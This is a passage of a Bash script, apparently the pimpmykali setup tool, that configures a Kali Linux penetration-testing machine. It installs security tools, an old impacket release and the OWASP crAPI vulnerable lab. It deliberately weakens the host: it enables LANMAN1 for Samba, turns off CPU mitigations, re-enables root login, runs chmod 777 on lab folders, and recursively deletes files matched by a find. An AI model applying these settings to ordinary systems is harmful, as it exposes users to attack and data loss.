[ -f ${ROCKYOU_GZIP} ];\n      then\n        APP=\"gzip\"\n        FUNCTYPE=\"deflate\"\n        cd /usr/share/wordlists\n        echo -e \"${spaces}${greenplus} Decompressing ${ROCKYOU_GZIP}\"\n        gzip -dqf ${ROCKYOU_GZIP}\n        EXIT_STATUS=\"$?\"\n        check_exit_status ${APP} ${FUNCTYPE} ${EXIT_STATUS}\n        clean_vars\n      else \n        echo -e \"${spaces}${greenminus} rockyou.txt already decompressed, skipping\"\n    fi \n    }\n\n\nfix_locate() {\n    is_installed \"locate\"\n    }\n\n\nfix_htop() {\n    is_installed \"htop\"\n    }\n\n\nfix_seclists() {\n    is_installed \"seclists\"\n    }\n\n\nfix_flameshot() {\n    is_installed \"flameshot\"\n    }\n\n\nfix_theharvester() {\n    is_installed \"theharvester\"\n    }\n\n\ninstall_golang() {\n    is_installed \"golang\"\n    }\n\n\nfix_go_path() {\n    echo -e \"\\n  ${greenplus} Gopath Setup\"\n    findrealuser=$(logname)\n\n    if [ \"$findrealuser\" == \"root\" ]\n     then\n      check_root_zshrc=$(cat /root/.zshrc | grep -c GOPATH)\n      [ -d /$findrealuser/go ] && echo -e \"\\n  ${greenminus} go directories already exist in /$findrealuser\" || echo -e \"\\n  ${greenplus} creating directories /$findrealuser/go /$findrealuser/go/bin /$findrealuser/go/src\"; mkdir -p /$findrealuser/go/{bin,src}\n       if [ $check_root_zshrc -ne 0 ]\n         then\n          echo -e \"${spaces}${redminus} GOPATH Variables for $findrealuser already exist in /$findrealuser/.zshrc - Not changing\"\n         else\n          echo -e \"${spaces}${greenplus} Adding GOPATH Variables to /root/.zshrc\"\n          eval echo -e 'export GOPATH=\\$HOME/go' >> /root/.zshrc\n          eval echo -e 'export PATH=\\$PATH:\\$GOPATH/bin' >> /root/.zshrc\n       fi\n      check_root_bashrc=$(cat /root/.bashrc | grep -c GOPATH)\n       if [ $check_root_bashrc -ne 0 ]\n        then\n         echo -e \"${spaces}${redminus} GOPATH Variables for $findrealuser already exist in /$findrealuser/.bashrc - Not changing\"\n        else\n         echo -e \"${spaces}${greenplus} Adding GOPATH Variables to /root/.bashrc\"\n         eval echo -e 'export GOPATH=\\$HOME/go' >> /root/.bashrc\n         eval echo -e 'export PATH=\\$PATH:\\$GOPATH/bin' >> /root/.bashrc\n       fi\n     else\n      check_user_zshrc=$(cat /home/$findrealuser/.zshrc | grep -c GOPATH)\n       [ -d /home/$findrealuser/go ] && echo -e \"\\n  ${greenminus} go directories already exist in /home/$finduser\" || echo -e \"\\n  ${greenplus} creating directories /home/$findrealuser/go /home/$findrealuser/go/bin /home/$findrealuser/go/src\"; mkdir -p /home/$findrealuser/go/{bin,src}; chown -R $findrealuser:$findrealuser /home/$findrealuser/go\n       if [ $check_user_zshrc -ne 0 ]\n        then\n         echo -e \"${spaces}${redminus} GOPATH Variables for user $findrealuser already exist in /home/$findrealuser/.zshrc  - Not Changing\"\n        else\n         echo -e \"${spaces}${greenplus} Adding GOPATH Variables to /home/$findrealuser/.zshrc\"\n         eval echo -e 'export GOPATH=\\$HOME/go' >> /home/$findrealuser/.zshrc\n         eval echo -e 'export PATH=\\$PATH:\\$GOPATH/bin' >> /home/$findrealuser/.zshrc\n       fi\n      check_user_bashrc=$(cat /home/$findrealuser/.bashrc | grep -c GOPATH)\n       if [ $check_user_bashrc -ne 0 ]\n        then\n         echo -e \"${spaces}${redminus} GOPATH Variables for user $findrealuser already exist in /home/$findrealuser/.bashrc - Not Changing\"\n        else\n         echo -e \"${spaces}${greenplus} Adding GOPATH Variables to /home/$findrealuser/.bashrc\"\n         eval echo -e 'export GOPATH=\\$HOME/go' >> /home/$findrealuser/.bashrc\n         eval echo -e 'export PATH=\\$PATH:\\$GOPATH/bin' >> /home/$findrealuser/.bashrc\n       fi\n    fi\n    }\n\n\nfix_nmap() {\n    # clam-av.nse\n    echo -e \"\\n  ${greenplus} Updating clamav-exec.nse\"\n    rm -f /usr/share/nmap/scripts/clamav-exec.nse\n    echo -e \"${spaces}${redminus} /usr/share/nmap/scripts/clamav-exec.nse removed \"\n    eval wget https://raw.githubusercontent.com/nmap/nmap/master/scripts/clamav-exec.nse -O /usr/share/nmap/scripts/clamav-exec.nse $silent\n    echo -e \"${spaces}${greenplus} /usr/share/nmap/scripts/clamav-exec.nse replaced with working version\"\n    \n    # http-shellshock.nse\n    SHELLSHOCK_FIXED_NSE=\"./addons/fixed-http-shellshock.nse\"\n    echo -e \"\\n  ${greenplus} Updating http-shellshock.nse\"\n    if [ -f ${SHELLSHOCK_FIXED_NSE} ]\n    then \n      cp -f ${SHELLSHOCK_FIXED_NSE} /usr/share/nmap/scripts/http-shellshock.nse $silent\n    else \n      eval wget https://raw.githubusercontent.com/Dewalt-arch/pimpmykali/master/fixed-http-shellshock.nse -O /usr/share/nmap/scripts/http-shellshock.nse $silent\n    fi\n    }\n\n\nfix_smbconf() {\n    check_smb_min=$(cat /etc/samba/smb.conf | grep -c -i \"client min protocol = LANMAN1\")\n\n    if [ $check_smb_min -eq 1 ]\n      then\n        echo -e \"\\n  ${greenplus} Checking /etc/samba/smb.conf \"\n        echo -e \"${spaces}${redminus} client min protocol is already set, skipping\"\n      else\n        sed 's/^   client min protocol =.*/client min protocol = LANMAN1/' -i /etc/samba/smb.conf\n        echo -e \"${spaces}${greenplus} /etc/samba/smb.conf updated\"\n        echo -e \"${spaces}${greenplus} added : client min protocol = LANMAN1\"\n    fi\n    }\n\n\nfix_grub() {\n    echo -e \"\\n  ${greenplus} Checking /etc/defult/grub\" \n    check_grub=$(cat /etc/default/grub | grep -i -c \"mitigations=off\" )\n\n    if [ $check_grub -eq 1 ]\n      then\n        echo -e \"${spaces}${greenplus} Found mitigations=off, skipping\"\n      else\n        sed 's/GRUB_CMDLINE_LINUX_DEFAULT=\"quiet\"/GRUB_CMDLINE_LINUX_DEFAULT=\"quiet mitigations=off\"/' -i /etc/default/grub\n        update-grub\n        echo -e \"${spaces}${greenplus} Added mitigations=off to GRUB_CMDLINE_LINUX_DEFAULT\"\n        echo -e \"${spaces}${redexclaim} Reboot for changes to take effect \\n\"\n    fi\n    }\n\n\nfix_bad_apt_hash() {\n    mkdir -p /etc/gcrypt\n    echo \"all\" > /etc/gcrypt/hwf.deny\n    }\n\n\ninstall_sublime() {\n    # code fix provided by aashiksamuel\n    echo -e \"\\n  ${greenplus} Installing sublime\"\n    is_installed \"gpg apt-transport-https\"\n    eval wget -qO - https://download.sublimetext.com/sublimehq-pub.gpg | gpg --no-default-keyring --keyring ./temp-keyring.gpg --import\n    eval gpg --no-default-keyring --keyring ./temp-keyring.gpg --export --output sublime-text.gpg\n    eval rm temp-keyring.gpg temp-keyring.gpg~\n    eval mkdir -p /usr/local/share/keyrings\n    eval mv ./sublime-text.gpg /usr/local/share/keyrings\n\n    eval echo \"deb [signed-by=/usr/local/share/keyrings/sublime-text.gpg] https://download.sublimetext.com/ apt/stable/\" > /etc/apt/sources.list.d/sublime-text.list\n    apt_update\n    is_installed \"sublime-text\"\n    }\n\n\nfix_sources() {\n    fix_bad_apt_hash\n\n    check_space=$(cat /etc/apt/sources.list | grep -c \"# deb-src http://.*/kali kali-rolling.*\")\n    check_nospace=$(cat /etc/apt/sources.list | grep -c \"#deb-src http://.*/kali kali-rolling.*\")\n    get_current_mirror=$(cat /etc/apt/sources.list | grep \"deb-src http://.*/kali kali-rolling.*\" | cut -d \"/\" -f3)\n    \n    if [[ $check_space -eq 0 && $check_nospace -eq 0 ]]\n      then\n        echo -e \"\\n  ${greenminus} # deb-src or #deb-sec not found - skipping\"\n        force_apt_update=0\n      elif [ $check_space -eq 1 ];\n        then\n          echo -e \"\\n  ${greenplus} # deb-src with space found in sources.list uncommenting and enabling deb-src\"\n          sed 's/\\# deb-src http\\:\\/\\/.*\\/kali kali-rolling.*/\\deb-src http\\:\\/\\/'$get_current_mirror'\\/kali kali-rolling main contrib non\\-free''/' -i /etc/apt/sources.list\n          echo -e \"${spaces}${greenplus} new /etc/apt/sources.list written with deb-src enabled\"\n          force_apt_update=1\n      elif [ $check_nospace -eq 1 ]\n        then\n          echo -e \"\\n  ${greenplus} #deb-src without space found in sources.list uncommenting and enabling deb-src\"\n          sed 's/\\#deb-src http\\:\\/\\/.*\\/kali kali-rolling.*/\\deb-src http\\:\\/\\/'$get_current_mirror'\\/kali kali-rolling main contrib non\\-free''/' -i /etc/apt/sources.list\n          echo -e \"${spaces}${greenplus} new /etc/apt/sources.list written with deb-src enabled\"\n          force_apt_update=1\n    fi\n    sed -i 's/non-free$/non-free non-free-firmware/' /etc/apt/sources.list\n\n    if [[ $force_apt_update -eq 1 ]]\n      then\n        apt_update\n      fi\n    }\n\n\nfix_sead_warning() {\n    if [ $SPEEDRUN -eq 1 ]\n    then \n        fix_sead_run \n    else \n        echo -e \"\n\n \"$bold$redexclaim$red\" WARNING \"$redexclaim$bold$red\"  PIMPMYKALI IMPACKET REMOVAL FUNCTION  \"$redexclaim$bold$red\" WARNING \"$redexclaim$white$norm\"\n\n                 *** READ FULLY BEFORE PRESSING ANY KEY ***\n\n   \"$red\"DISCLAIMER:\"$white\" Warning: Last Resort Impacket Removal\n   This function is intended as a last resort to remove impacket-0.9.19 and install a clean version. \n   \n   This function will attempt to remove impacket and related files from common directories, \n   but may not cover every scenario.\n\n   This WILL RECURSIVLY DELETE ANY DIR NAMED impacket* from the following:\n    /opt  /usr/bin  /usr/local/lib  /usr/lib  /home/$finduser/.local/bin\n    /home/$finduser/.local/lib  /root/.local/lib  /root/.local/bin\n\n   AND ANY related .py and .pyc files from impacket in the following:\n    /usr/bin  /local/local/bin  /root/.local/bin  /home/$finduser/.local/bin\n\n   Answering only Y to the following prompt will preform the above actions,\n   pressing ANY OTHER KEY WILL EXIT\n\n   \"\n    read -n1 -p \" Press Y to execute or any other key to exit: \" fixsead_userinput\n    case $fixsead_userinput in\n      y|Y) fix_sead_run;;\n        *) exit;;\n    esac\n    fi\n    }\n\n\nfix_sead_run() {\n    SEAD=$(find /opt /usr/bin /usr/local/lib /usr/lib /home/$finduser/.local/bin /home/$finduser/.local/lib ~/.local/lib ~/.local/bin -name impacket* 2> /dev/null)\n    \n    echo -e \"\\n ${greenplus} Preparing to nuke Impacket... \\n\"\n    \n    echo -e \"${spaces}${greenplus} function running removing :\\n$SEAD\\n\"\n    rm -rf $SEAD\n    fix_impacket_array\n    install_old_impacket\n    }\n\n\nfix_impacket_array() {\n    arr=('addcomputer.py' 'atexec.py' 'dcomexec.py' 'dpapi.py' 'esentutl.py' 'findDelegation.py' 'GetADUsers.py' 'getArch.py' 'GetNPUsers.py'\n         'getPac.py' 'getST.py' 'getTGT.py' 'GetUserSPNs.py' 'goldenPac.py' 'karmaSMB.py' 'kintercept.py' 'lookupsid.py' 'mimikatz.py'\n         'mqtt_check.py' 'mssqlclient.py' 'mssqlinstance.py' 'netview.py' 'nmapAnswerMachine.py' 'ntfs-read.py' 'ntlmrelayx.py' 'ping6.py'\n         'ping.py' 'psexec.py' 'raiseChild.py' 'rdp_check.py' 'registry-read.py' 'reg.py' 'rpcdump.py' 'rpcmap.py' 'sambaPipe.py' 'samrdump.py'\n         'secretsdump.py' 'services.py' 'smbclient.py' 'smbexec.py' 'smbrelayx.py' 'smbserver.py' 'sniffer.py' 'sniff.py' 'split.py'\n         'ticketConverter.py' 'ticketer.py' 'wmiexec.py' 'wmipersist.py' 'wmiquery.py' 'addcomputer.pyc' 'atexec.pyc' 'dcomexec.pyc' 'dpapi.pyc'\n         'esentutl.pyc' 'findDelegation.pyc' 'GetADUsers.pyc' 'getArch.pyc' 'GetNPUsers.pyc' 'getPac.pyc' 'getST.pyc' 'getTGT.pyc'\n         'GetUserSPNs.pyc' 'goldenPac.pyc' 'karmaSMB.pyc' 'kintercept.pyc' 'lookupsid.pyc' 'mimikatz.pyc' 'mqtt_check.pyc' 'mssqlclient.pyc'\n         'mssqlinstance.pyc' 'netview.pyc' 'nmapAnswerMachine.pyc' 'ntfs-read.pyc' 'ntlmrelayx.pyc' 'ping6.pyc' 'ping.pyc' 'psexec.pyc'\n         'raiseChild.pyc' 'rdp_check.pyc' 'registry-read.pyc' 'reg.pyc' 'rpcdump.pyc' 'rpcmap.pyc' 'sambaPipe.pyc' 'samrdump.pyc'\n         'secretsdump.pyc' 'services.pyc' 'smbclient.pyc' 'smbexec.pyc' 'smbrelayx.pyc' 'smbserver.pyc' 'sniffer.pyc' 'sniff.pyc' 'split.pyc'\n         'ticketConverter.pyc' 'ticketer.pyc' 'wmiexec.pyc' 'wmipersist.pyc' 'wmiquery.pyc' )\n\n     for impacket_file in ${arr[@]}; do\n       rm -f /usr/bin/$impacket_file /usr/local/bin/$impacket_file ~/.local/bin/$impacket_file /home/$finduser/.local/bin/$impacket_file\n     done\n    }\n\n\ninstall_old_impacket() {\n    install_pip2\n    eval /usr/bin/pip2 uninstall impacket\n    fix_impacket_array\n    [ -d /opt/impacket-0.9.19 ] && rm -rf /opt/impacket-0.9.19\n    eval wget https://github.com/SecureAuthCorp/impacket/releases/download/impacket_0_9_19/impacket-0.9.19.tar.gz -O /tmp/impacket-0.9.19.tar.gz\n    eval tar xvfz /tmp/impacket-0.9.19.tar.gz -C /opt\n    cd /opt\n    chown -R root:root impacket-0.9.19\n    cd /opt/impacket-0.9.19\n    eval /usr/bin/pip2 install setuptools flask ldap3==2.5.1 pycryptodome\n    eval /usr/bin/pip2 install -r requirements.txt\n    cd /opt/impacket-0.9.19\n    eval /bin/python2.7 ./setup.py install \n    rm -f /tmp/impacket-0.9.19.tar.gz\n    eval apt -y reinstall python3-impacket impacket-scripts\n    echo -e \"\\n${spaces}${greenplus} installed: impacket-0.9.19\"\n    }\n\n\nmake_rootgreatagain() {\n    if [[ $ENABLE_ROOT -eq 1 ]]\n      then \n        if [[ $SPEEDRUN -eq 1 ]]\n          then\n          enable_rootlogin \n          else\n            echo -e \"\\n\\n KALI-ROOT-LOGIN INSTALLATION: - PAGE 1   \"$red\"*** READ CAREFULLY! ***\"$white\" \\n\"\n            echo -e \"   Kali 2019.x and prior the default user was root\"\n            echo -e \"   As of Kali 2020.1 and newer this was changed, the default user was changed to be \"\n            echo -e \"   an\" $yellow$bold\"actual user\"$norm$white\" on the system and not \"$red$bold\"root\"$norm$white\", this user is : kali (by default) \"\n            echo -e \"\\n   Press Y - If you wish to re-enable the ability to login as root and be root all the time\"\n            echo -e \"     If you choose Yes - a second screen will prompt you to copy all of /home/$finduser to /root\"\n            echo -e \"     as there is nothing in the /root directory by default\"\n            echo -e \"\\n   Press N - The script will skip this section, and not re-enable the login as root function\"\n            echo -e \"\\n   \"$bold$red\"If you are confused or dont understand what\"$norm$white\n            echo -e \"   \"$bold$red\"this part of the script is doing, press N\"$norm$white\n            echo -e \"\\n   Do you want to re-enable the ability to login as root in kali?\"\n            read -n1 -p \"   Please type Y or N : \" userinput\n            case $userinput in\n              y|Y) enable_rootlogin $force;;\n              n|N) echo -e \"\\n\\n ${redexclaim} skipping root login setup\" ;;\n              *) echo -e \"\\n invalid key try again Y or N\"; make_rootgreatagain;;\n            esac\n        fi\n      else \n        echo -e \"\\n  ${greenminus} Enable root login is ${ENABLE_ROOT} skipping\"\n    fi\n    }\n\n\nenable_rootlogin() {\n    is_installed \"kali-root-login\"\n\n    echo -e \"${spaces}${greenplus} Root login enabled, enter a password for root \\n\"\n    passwd root\n    if [ \"$?\" -ne 0 ]\n      then\n        echo -e \"${spaces}${redexclaim} Passwords did not match - restarting this function\"\n        enable_rootlogin\n      else\n        echo -e \"${spaces}${greenplus} Password updated\"\n      fi\n    \n    echo -e \"${spaces}${greenplus} root login enabled\"\n\n    if [[ $SPEEDRUN -eq 1 ]]\n    then\n      ask_homekali_to_root\n    else \n      ask_homekali_to_root\n    fi \n    }\n\n\nask_homekali_to_root() {\n    if [[ $SPEEDRUN -eq 1 ]]\n      then \n        ask_are_you_sure\n      else \n        echo -e \"\\n KALI-ROOT-LOGIN INSTALLATION: - PAGE 2   \"$red\"*** READ CAREFULLY! ***\"$white\" \\n\"\n        echo -e \"   This section of the script is only executed if Yes was selected at the enable root login prompt\\n\"\n        echo -e \"   If you are planning on operating your kali install as root instead of the user kali, \"\n        echo -e \"   by default there is nothing in /root, This script has the ability to copy everything\"\n        echo -e \"   from /home/$finduser to /root for you. \\n\"\n        echo -e \"  $red Warning:$white This copy function $red will overwrite $white anything in /root with the entire contents of /home/kali\"\n        echo -e \"   The copy statement that is going to be performed if you select Y is:\\n \"\n        echo -e \"    cp -Rvf /home/$finduser/* /home/$finduser/.* /root\"\n        echo -e \"\\n   Would you like to copy everything from /home/$finduser to /root ?\"\n        echo -e \"     Press Y - to copy everything from /home/$finduser to /root\"\n        echo -e \"     Press N - do not copy anything to /root and skip this function\\n\"\n        read -n1 -p \"   Please type Y or N : \" userinput\n        case $userinput in\n          y|Y) ask_are_you_sure;;\n          n|N) echo -e \"\\n\\n  ${redexclaim} skipping copy of /home/$finduser to /root\" ;;\n          *) echo -e \"\\n\\n  ${redexclaim} Invalid key try again, Y or N keys only ${redexclaim}\"; ask_homekali_to_root;;\n        esac\n    fi\n    }\n\n\nask_are_you_sure() {\n    if [[ $SPEEDRUN -eq 1 ]]\n      then\n        perform_copy_to_root\n      else \n        echo -e \"\\n\\n  Are you sure you want to copy all of /home/$finduser to /root ?\"\n        read -n1 -p \"  Please type Y or N : \" userinput\n        case $userinput in\n          y|Y) perform_copy_to_root;;\n          n|N) echo -e \"\\n\\n  ${redexclaim} skipping copy of /home/$finduser to /root - not copying \";;\n          *) echo -e \"\\n\\n  ${redexclaim} Invalid key try again, Y or N keys only ${redexclaim}\"; ask_are_you_sure;;\n        esac\n    fi\n    }\n\n\nperform_copy_to_root() {\n    echo -e \"\\n\\n  ${greenplus} Copying everything from /home/$finduser to /root... Please wait...\"\n   \n     if [[ $finduser = \"root\" ]]\n      then\n       echo -e \"Already root skipping...\"\n     else\n       echo -e \"${spaces}${greenplus} Copying /home/$finduser/* to /root\"\n       eval cp -Rvf /home/$finduser/.* /home/$finduser/* /root >/dev/null 2>&1\n       \n       echo -e \"${spaces}${greenplus} Changing ownership:group of /root to root\"\n       eval chown -R root:root /root\n       \n       echo -e \"${spaces}${greenplus} Copy from /home/$finduser/* to /root - Complete\"\n     fi\n    }\n\n\nfix_broken_xfce() {\n    echo -e \"\\n  ${greenplus} Applying broken XFCE Fix  \\n \"\n    is_installed_reinstall \"xfce4-settings\"\n    echo -e \"${spaces}${greenplus} Broken XFCE Fix applied: xfce4-settings reinstalled  \\n\"\n    disable_power_xfce\n    }\n\n\nupdate_linux_headers() {\n    list_installed_kernels=$(ls /lib/modules)\n\n    echo -e \"\\n ${greenplus} Updating linux-headers\"\n    for each_installed_kernel in $list_installed_kernels\n      do\n        if apt-cache show linux-headers-${each_installed_kernel} &> /dev/null; \n          then \n            echo -e \"${spaces}${greenplus} Kernel ${each_installed_kernel} found, installing linux-headers-${each_installed_kernel}\"\n            is_installed \"linux-headers-${each_installed_kernel}\"\n          else\n            echo > /dev/null \n        fi\n    done\n\t  }\n\n\nonly_upgrade() {\n    fix_sources\n    echo -e \"\\n  ${greenplus} Starting Pimpmyupgrade   \\n\"\n    kernel_check=$(ls /lib/modules | sort -n | tail -n 1)\n    is_installed \"dkms build-essential linux-headers-${kernel_check}\"\n    apt_upgrade\n    update_linux_headers\n    virt_what\n    check_vm\n    }\n\n\nvirt_what() {\n    is_installed \"virt-what\"\n    }\n\n\ncheck_dmidecode() {\n    is_installed \"dmidecode\" \n    }\n\n\nvbox_fix_shared_folder_permission_denied() {\n    echo -e \"\\n  ${greenplus} Virtualbox shared folders fix\"\n    findgroup=$(groups $finduser | grep -i -c \"vboxsf\")\n\n    if [[ $findgroup = 0 ]]\n      then\n        eval adduser $finduser vboxsf\n        echo -e \"${spaces}{$greenplus} ${finduser} added to vboxsf group \"\n      else\n        echo -e \"${spaces}${greenminus} ${finduser} user is already a member of vboxsf group\\n\"\n    fi\n    }\n\n\nfix_virtualbox() {\n    is_installed_reinstall \"virtualbox-dkms virtualbox-guest-x11\"\n    \n    # get detected hostOS version of virtualbox-additions\n    check_dmidecode\n\n    VBOX_VER=$(dmidecode | grep -i vboxver | grep -E -o '[[:digit:]\\.]+' | tail -n 1)\n\n    echo -e \"${spaces}${greenplus} Downloading VBoxGuestAdditions_$VBOX_VER.iso\"\n    wget 'https://download.virtualbox.org/virtualbox/'$VBOX_VER'/VBoxGuestAdditions_'$VBOX_VER'.iso' -O /tmp/VBoxGuestAdditions_$VBOX_VER.iso\n    mkdir /tmp/vboxtmp\n    mount -o loop '/tmp/VBoxGuestAdditions_'$VBOX_VER'.iso' /tmp/vboxtmp\n    cp -f /tmp/vboxtmp/VBoxLinuxAdditions.run /tmp\n    umount /tmp/vboxtmp\n    chmod +x /tmp/VBoxLinuxAdditions.run\n    /tmp/VBoxLinuxAdditions.run install --force\n    /sbin/rcvboxadd quicksetup all\n\n    # get lastest additions\n    #mkdir /tmp/vboxtmp\n    #wget https://download.virtualbox.org/virtualbox/LATEST.TXT -O /tmp/vbox-latest\n    #vboxver=$(cat /tmp/vbox-latest)\n    #wget https://download.virtualbox.org/virtualbox/$vboxver/VBoxGuestAdditions_$vboxver.iso -O /usr/share/virtualbox/VBoxGuestAdditions.iso\n    #\n    #mount /usr/share/virtualbox/VBoxGuestAdditions.iso /tmp/vboxtmp\n    #cp -f /tmp/vboxtmp/VBoxLinuxAdditions.run /tmp/VBoxLinuxAdditions.run\n    #umount /tmp/vboxtmp\n    #rmdir /tmp/vboxtmp\n    #chmod +x /tmp/VBoxLinuxAdditions.run\n    #/tmp/VBoxLinuxAdditions.run install --force\n    #rm -f /tmp/VBoxLinuxAdditions.run\n    #/sbin/rcvboxadd quicksetup all\n    echo -e \"\\n  ${greenplus} VBoxGuestAdditions for version $VBOX_VER installed\"\n    echo -e \"\\n  ${redstar} A reboot of your system is required\"\n    }\n\n\ncheck_vm() {\n    is_installed \"linux-headers-$(uname -r)\"\n    \n    echo -e \"\\n  ${greenplus} Detecting hypervisor\"\n    vbox_check=$(virt-what | grep -i -c \"virtualbox\")    # virtualbox check\n    vmware_check=$(virt-what | grep -i -c \"vmware\")      # vmware check (workstation/player/fusion)\n    qemu_check=$(virt-what | grep -i -c \"qemu\\|kvm\")     # qemu or kvm check (qemu/utm)\n  \n    if [ $vbox_check -eq 1 ]\n      then\n        echo -e \"${spaces}${greenplus} *** Virtualbox Detected ***\"\n        echo -e \"${spaces}${greenplus} installing virtualbox-dkms virtualbox-guest-additions-iso virtualbox-guest-x11\"\n        fix_virtualbox\n        vbox_fix_shared_folder_permission_denied\n      elif  [ $vmware_check -eq 1 ]\n        then\n          echo -e \"${spaces}${greenplus} *** Vmware Detected ***\"\n          is_installed_remove fuse\n          is_installed_reinstall \"open-vm-tools-desktop fuse3\"\n       elif  [ $qemu_check -eq 1 ]\n         then\n          echo -e \"${spaces}${greenplus} *** Qemu Detected ***\"\n          is_installed_reinstall \"spice-vdagent qemu-guest-agent\"\n    \n      else\n        echo -e \"\\n ${redstar} Hypervisor not detected, Possible bare-metal installation not updating\"\n    fi\n    }\n\n\nhacking_api_create_cleanupsh() { \n    cleanup_script=\"cleanup.sh\"\n    echo -e \"\\n  ${greenplus} Creating cleanup.sh\" \n    # create cleanup.sh - prompts user for a Y or y prompt and provides warning before executing commands\n    echo -e \"#!/bin/bash\" > $cleanup_script\n    echo -e \"\\n\" >> $cleanup_script\n    echo \"cleanup_docker () {\" >> $cleanup_script\n    echo -e \"    sudo docker stop \\$(sudo docker ps -aq)\" >> $cleanup_script\n    echo -e \"    sudo docker rm \\$(sudo docker ps -aq)\" >> $cleanup_script\n    echo -e \"    sudo docker rm \\$(sudo docker images -q)\" >> $cleanup_script \n    echo -e \"    sudo docker volume rm \\$(sudo docker volume ls -q)\" >> $cleanup_script \n    echo -e \"    sudo docker network rm \\$(sudo docker network ls -q)\" >> $cleanup_script\n    echo \"    exit\" >> $cleanup_script\n    echo \"    }\" >> $cleanup_script\n    echo -e \"\\n\" >> $cleanup_script\n    echo \"    echo -e \\\"\\n  Warning! This script is about to remove all docker containers and networks!\\\" \" >> $cleanup_script\n    echo \"    read -n3 -p \\\"  Press Y or y to proceed any other key to exit : \\\" userinput \" >> $cleanup_script\n    echo \"    case \\$userinput in\" >> $cleanup_script\n    echo \"        y|Y) cleanup_docker ;;\" >> $cleanup_script\n    echo \"          *) exit ;;\" >> $cleanup_script\n    echo \"    esac\" >> $cleanup_script\n    chmod +x cleanup.sh\n    \n    startup_script=\"start-api-hacking.sh\"\n    echo -e \"\\n  ${greenplus} Creating start-api-hacking.sh\"\n    echo -e \"#!/bin/bash\" > $startup_script\n    echo -e \"\\n\" >> $startup_script\n    echo -e \"cd ~/labs/crAPI/deploy/docker\" >> $startup_script \n    echo -e \"sudo VERSION=develop docker-compose -f docker-compose.yml pull\" >> $startup_script\n    echo -e \"sudo VERSION=develop docker-compose -f docker-compose.yml --compatibility up -d\" >> $startup_script\n    chmod +x start-api-hacking.sh\n    }\n\n\nhacking_api_prereq() {\n    is_installed \"docker.io\"\n    fix_dockercompose\n\n    echo -e \"\\n  ${greenplus} Starting docker service and enabling \" \n    APP=\"docker\"\n    FUNCTYPE=\"start service\"\n    systemctl enable docker --now\n    EXIT_STATUS=\"$?\"\n    check_exit_status ${APP} ${FUNCTYPE} ${EXIT_STATUS}\n\n    # determine arch type and download the respective postman for that arch\n    echo -e \"\\n  ${greenplus} Downloading Postman for $arch\"\n    if [ $arch == \"amd64\" ]\n      then\n        wget https://dl.pstmn.io/download/latest/linux_64 -O /opt/postman.tar.gz\n    elif [ $arch == \"arm64\" ]\n      then\n        wget https://dl.pstmn.io/download/latest/linux_arm64 -O /opt/postman.tar.gz\n    elif [ $arch == \"\" ]\n      then\n        echo -e \"\\n  ${redexclaim} Unable to determine arch type\" \n    fi \n    \n    #install postman and symlink to /usr/bin/postman to be in $PATH\n    echo -e \"\\n  ${greenplus} Installing Postman\"\n    cd /opt \n    tar xvfz postman.tar.gz $silent \n    ln -sf /opt/Postman/Postman /usr/bin/postman\n    rm /opt/postman.tar.gz\n\n    # user specific setup \n    if [ $finduser == \"root\" ]\n      then \n        if [ ! -d /$finduser/labs ]\n          then \n            echo -e \"\\n  ${greenplus} Creating labs directory /$finduser/labs\"\n            mkdir /$finduser/labs\n        fi \n      \n        cd /$finduser/labs\n        echo -e \"\\n  ${greenplus} Installing crAPI to /$finduser/labs/crAPI\"\n        git clone https://github.com/OWASP/crAPI $silent \n      \n        # create cleanup.sh in the crAPI directory\n        hacking_api_create_cleanupsh\n        cd /$finduser/labs/crAPI/deploy/docker\n     else \n        if [ ! -d /home/$finduser/labs ]\n          then \n            echo -e \"\\n  ${greenplus} Creating labs directory /home/$finduser/labs\"\n            mkdir /home/$finduser/labs\n        fi \n      \n        cd /home/$finduser/labs\n        echo -e \"\\n  ${greenplus} Installing crAPI to /home/$finduser/labs/crAPI\"\n        git clone https://github.com/OWASP/crAPI $silent \n      \n        # create cleanup.sh in the crAPI directory\n        hacking_api_create_cleanupsh \n        chmod +x cleanup.sh\n        chown -R $finduser:$finduser /home/$finduser/labs\n        cd /home/$finduser/labs/crAPI/deploy/docker\n    fi\n    \n    chmod -R 777 $HOME/peh/labs $HOME/peh/labs/* \n    echo -e \"\\n  ${greenplus} Please cd $PWD\"\n    echo -e \"       and run the following command : sudo docker-compose up \"\n    }  \n\n\ncheck_nessusd_active() {\n    check_nessusd_service=$(sudo systemctl status nessusd | grep -i -c  \"active (running)\")\n    if [[ $check_nessusd_service -ge 1 ]]\n     then\n      nessusd_service_active=1\n      echo -e \"\\n  ${greenplus} nessusd service is active\"\n     else\n      nessusd_service_active=0\n      echo -e \"\\n  ${redexclaim} nessusd service is not active\"\n    fi\n    }\n\n\ncheck_nessus_installed_opt_nessus() {\n    if [[ -d /opt/nessus ]]\n    then \n     echo -e \"\\n  ${greenplus} Detected nessus installation at /opt/nessus\"\n     echo -e \"${spaces}${greenplus} Removing all files from /opt/nessus\"\n     rm -rf /opt/nessus\n    else\n     echo -e \"\\n  ${greenplus} Nessus not detected at /opt/nessus\"\n    fi\n    }\n\n\ncheck_nessus_installed_dpkg() (\n    dpkg_nessus=$(dpkg -l | grep -i -c nessus)\n    if [ $dpkg_nessus -ge 1 ]\n     then \n      echo -e \"\\n  ${greenplus} Detected nessus installed via dpkg -l\" \n      echo -e \"${spaces}${greenplus} Removing Nessus via dpkg -r\"\n      dpkg -r Nessus &> /dev/null\n     else \n      echo -e \"\\n  ${greenplus} No detectinon of nessus installed via dpkg\"\n    fi\n    )\n\n\nnuke_nessus() {\n    check_nessusd_active\n    if [ $nessusd_service_active -ge 1 ]\n     then \n      echo -e \"\\n  ${greenplus} Stopping nessusd service\"\n      systemctl stop --now nessusd\n      check_nessus_installed_dpkg\n      check_nessus_installed_opt_nessus\n      echo -e \"${spaces}${greenplus} Nessus has been removed\"\n    fi\n    }\n\n\nremove_nessus() {\n    check_nessusd_active\n    if [[ $nessusd_service_active -ge 1 ]]\n     then\n      echo -e \"\\n  Warning! You are about to uninstall and remove Nessus\"\n      read -n1 -p \"  Press Y or y to continue, any other key to exit: \" nessus_removeinput\n      case $nessus_removeinput in\n        y|Y) nuke_nessus;;\n          *) echo -e \"\\n  ${greenplus} Aborting uninstallation of nessus\"; exit;;\n      esac\n     else\n      echo -e \"\\n  ${redexclaim} nessusd service is not running\"\n    fi\n    }\n\n\ninstall_nessus() {\n    # check if nessus is already installed and build out a remove function\n    if [ $arch == \"amd64\" ]\n      then\n      nessus_amd64_file=$(curl https://www.tenable.com/downloads/nessus\\?loginAttempted\\=true | grep -o -m1 -E 